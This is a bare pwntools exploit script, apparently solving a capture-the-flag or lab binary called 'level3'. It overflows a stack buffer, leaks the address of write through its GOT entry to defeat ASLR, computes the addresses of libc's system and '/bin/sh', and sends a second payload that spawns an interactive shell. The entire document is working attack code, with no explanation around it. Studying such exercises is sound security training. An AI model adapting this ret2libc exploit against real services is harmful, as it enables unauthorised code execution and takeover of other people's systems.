from pwn import *                                                                                                      
conn = process("./level3")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
e=ELF('./level3')
pad=0x88
vulfun_addr=0x0804844B  
write_plt=e.symbols['write'] 
write_got=e.got['write'] 

payload1=b'A'*pad+b"BBBB"+p32(write_plt)+p32(vulfun_addr)+p32(1)+p32(write_got)+p32(4)
conn.recvuntil(b"Input:\n")
conn.sendline(payload1)

write_addr=u32(conn.recv(4))

#calculate the system_address in memory
libc_write=libc.symbols['write']
libc_system=libc.symbols['system']
libc_sh=next(libc.search(b'/bin/sh'))

system_addr=write_addr-libc_write+libc_system 
sh_addr=write_addr-libc_write+libc_sh

payload2=b'A'*pad+b"BBBB"+p32(system_addr)+b"dead"+p32(sh_addr)
conn.sendline(payload2)
conn.interactive()
